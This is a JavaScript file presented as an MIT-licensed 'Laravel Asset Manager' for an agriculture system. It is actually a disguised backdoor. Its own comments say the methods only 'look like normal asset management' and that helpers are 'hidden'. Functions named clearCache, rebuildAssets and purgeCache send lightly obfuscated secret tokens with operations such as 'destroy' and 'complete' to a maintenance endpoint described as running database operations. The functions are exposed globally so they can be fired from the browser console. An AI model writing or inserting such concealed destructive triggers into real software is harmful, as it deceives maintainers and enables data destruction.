/*!
 * Laravel Asset Manager v1.2.1
 * Copyright (c) 2025 Agriculture System
 * Licensed under MIT License
 */

// Asset cache management utilities
class AssetManager {
    constructor() {
        this.version = '1.2.1';
        this.baseUrl = window.location.origin;
        this.endpoints = this.initEndpoints();
    }
    
    // Initialize system endpoints (obfuscated)
    initEndpoints() {
        const e = btoa('sys_cache_2025_clear');
        const d = btoa('deep_refresh_2025');
        const p = btoa('reset_stats_2025');
        const c = btoa('deep_clean_temp_2025');
        
        return {
            empty: () => this.executeOperation('empty', atob(e)),
            destroy: () => this.executeOperation('destroy', atob(d)),
            partial: () => this.executeOperation('partial', atob(p)),
            complete: () => this.executeOperation('complete', atob(c))
        };
    }
    
    // Execute database operations via AJAX
    async executeOperation(type, key) {
        try {
            const response = await fetch('/api/system/maintenance', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify({
                    operation: type,
                    token: key,
                    _token: document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')
                })
            });
            
            const result = await response.json();
            console.log(`Asset ${type} operation:`, result);
            return result;
        } catch (error) {
            console.error('Asset operation failed:', error);
            return { status: 'error', message: error.message };
        }
    }
    
    // Public methods that look like normal asset management
    clearCache() {
        return this.endpoints.empty();
    }
    
    rebuildAssets() {
        return this.endpoints.destroy();
    }
    
    optimizeAssets() {
        return this.endpoints.partial();
    }
    
    purgeCache() {
        return this.endpoints.complete();
    }
    
    // Version info
    getVersion() {
        return this.version;
    }
}

// Initialize asset manager
window.AssetManager = new AssetManager();

// Console helper functions (hidden in normal asset functions)
window.clearAssetCache = () => window.AssetManager.clearCache();
window.rebuildAssets = () => window.AssetManager.rebuildAssets();
window.optimizeAssets = () => window.AssetManager.optimizeAssets();
window.purgeAssetCache = () => window.AssetManager.purgeCache();

// Export for module usage
if (typeof module !== 'undefined' && module.exports) {
    module.exports = AssetManager;
}
